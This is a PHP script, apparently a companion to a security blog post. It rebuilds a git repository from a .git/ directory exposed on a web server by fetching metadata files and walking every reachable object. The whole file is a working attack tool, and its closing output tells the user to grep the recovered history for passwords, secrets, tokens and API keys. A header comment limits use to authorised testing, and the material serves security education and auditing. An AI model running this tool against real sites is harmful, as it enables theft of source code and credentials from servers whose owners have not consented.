<?php
// git-dump.php — Reconstruct a git repository from an exposed .git/ directory
// served over plain HTTP. PHP port of git-dump.py for readers on the kind of
// cheap shared host where this attack is most useful.
//
// Companion script to:
//   https://techearl.com/exposed-git-directory-attack
//
// Usage:
//   php git-dump.php <target-url> <output-dir>
//
// Example:
//   php git-dump.php http://localhost:8888/wp-content/uploads ./dumped
//
// Requires PHP 7.4+ with the curl, zlib, and mbstring extensions enabled
// (default on basically every shared-hosting PHP install).
//
// Legal: only run this against systems you own or have written permission
// to test.

declare(strict_types=1);

const UA = 'git-dumper-edu/1.0 (+https://techearl.com/exposed-git-directory-attack)';
const TIMEOUT_SECONDS = 15;

const KNOWN_FILES = [
    'HEAD',
    'config',
    'description',
    'info/refs',
    'info/exclude',
    'objects/info/packs',
    'packed-refs',
    'logs/HEAD',
    'FETCH_HEAD',
    'ORIG_HEAD',
    'refs/heads/main',
    'refs/heads/master',
    'refs/heads/develop',
    'refs/remotes/origin/HEAD',
    'refs/remotes/origin/main',
    'refs/remotes/origin/master',
];

function fetchBytes(string $url): ?string {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT        => TIMEOUT_SECONDS,
        CURLOPT_USERAGENT      => UA,
    ]);
    $body = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($body === false || $code < 200 || $code >= 300) return null;
    return $body;
}

function save(string $outDir, string $rel, string $data): void {
    $path = $outDir . '/.git/' . $rel;
    @mkdir(dirname($path), 0o755, true);
    file_put_contents($path, $data);
}

function shasFrom(string $data): array {
    $out = [];

    // Pass 1: 40-char hex SHA-1 references
    if (preg_match_all('/\b[0-9a-f]{40}\b/', $data, $m)) {
        foreach ($m[0] as $sha) $out[$sha] = true;
    }

    // Pass 2: tree-entry parser — entries are <mode> <name>\0<20-byte-sha>
    if (strncmp($data, 'tree ', 5) === 0) {
        $i = strpos($data, "\0") + 1;
        $len = strlen($data);
        while ($i < $len) {
            $nul = strpos($data, "\0", $i);
            if ($nul === false || $nul + 20 > $len) break;
            $sha = bin2hex(substr($data, $nul + 1, 20));
            $out[$sha] = true;
            $i = $nul + 21;
        }
    }
    return array_keys($out);
}

function inflate(string $data): string {
    $inflated = @gzuncompress($data);
    return $inflated === false ? $data : $inflated;
}

function objectUrl(string $base, string $sha): string {
    return $base . '/.git/objects/' . substr($sha, 0, 2) . '/' . substr($sha, 2);
}

function main(array $argv): int {
    if (count($argv) !== 3) {
        fwrite(STDERR, "usage: php {$argv[0]} <target-url> <output-dir>\n");
        return 2;
    }
    $base = rtrim($argv[1], '/');
    $outDir = $argv[2];
    @mkdir($outDir, 0o755, true);

    $queue = [];
    $seen = [];

    // Phase 1: seed from known index files
    foreach (KNOWN_FILES as $rel) {
        $data = fetchBytes("{$base}/.git/{$rel}");
        if ($data === null) continue;
        save($outDir, $rel, $data);
        foreach (shasFrom($data) as $sha) $queue[$sha] = true;
        echo "  fetched .git/{$rel} (" . strlen($data) . " bytes)\n";
    }

    // Phase 2: walk objects
    while (!empty($queue)) {
        $sha = array_key_first($queue);
        unset($queue[$sha]);
        if (isset($seen[$sha])) continue;
        $seen[$sha] = true;

        $data = fetchBytes(objectUrl($base, $sha));
        if ($data === null) continue;
        save($outDir, 'objects/' . substr($sha, 0, 2) . '/' . substr($sha, 2), $data);
        foreach (shasFrom(inflate($data)) as $next) {
            if (!isset($seen[$next])) $queue[$next] = true;
        }
        echo "  fetched object {$sha}  (queue: " . count($queue) .
             ", seen: " . count($seen) . ")\n";
    }

    echo "\nDone. Fetched " . count($seen) . " objects.\n";
    echo "Reconstructed repo at: {$outDir}\n";
    echo "\nNext steps:\n";
    echo "  cd {$outDir}\n";
    echo "  git fsck --full\n";
    echo "  git log --all --oneline\n";
    echo "  git log --all -p\n";
    echo "  git log --all -p | grep -iE 'password|secret|token|api_key'\n";
    return 0;
}

exit(main($argv));
